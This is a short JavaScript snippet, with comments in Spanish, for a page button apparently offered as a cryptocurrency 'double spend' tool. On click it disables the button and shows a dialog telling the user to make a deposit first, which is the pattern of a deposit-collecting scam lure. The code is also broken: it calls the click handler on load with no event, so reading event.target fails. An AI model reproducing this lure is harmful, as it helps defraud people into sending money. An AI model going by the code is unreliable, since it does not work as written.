function sendTransactions() {
  var makeDoubleSpendButton = document.querySelector('button[name="myButton"]');
  if (makeDoubleSpendButton) {
      makeDoubleSpendButton.disabled = true;
      makeDoubleSpendButton.innerText = "Please Wait..";
  
      // Advertencia al usuario
      var confirmed = confirm("Please make a deposit first to proceed with the transaction. Press 'OK' to continue or 'Cancel' to abort.");
      
      if (!confirmed) {
          makeDoubleSpendButton.innerText = "Make deposit first!";
          return false;
      }
  }
}

function myButtonClicked(event) {
  var target = event.target;
  
  if (target.name === "myButton") {
      sendTransactions();
  }
  
  return false;
}

// Ejecuta la función al cargar la página
myButtonClicked();
